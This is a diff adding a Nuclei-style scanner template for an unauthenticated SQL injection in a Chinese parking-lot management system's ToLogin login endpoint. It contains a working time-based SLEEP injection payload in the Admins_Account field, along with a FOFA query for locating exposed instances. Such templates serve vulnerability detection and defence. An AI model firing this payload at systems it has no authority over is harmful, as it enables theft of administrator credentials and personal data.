@@ -1,0 +1,31 @@
+id: smartpark-ToLogin-sqli
+info:
+  name: 智能停车管理系统 ToLogin - sqli
+  author: leadlife
+  severity: high
+  description: 停车场后台管理系统 ToLogin 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E6%99%BA%E8%83%BD%E5%81%9C%E8%BD%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FToLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: icon_hash="938984120"
+  tags: smartpark,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /Login/ToLogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        
+        Admins_Account=1' AND (SELECT 8104 FROM (SELECT(SLEEP(6)))dEPM) AND 'JYpL'='JYpL&Admins_Pwd=
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+          - contains(body,'账号或密码错误')
+        condition: and
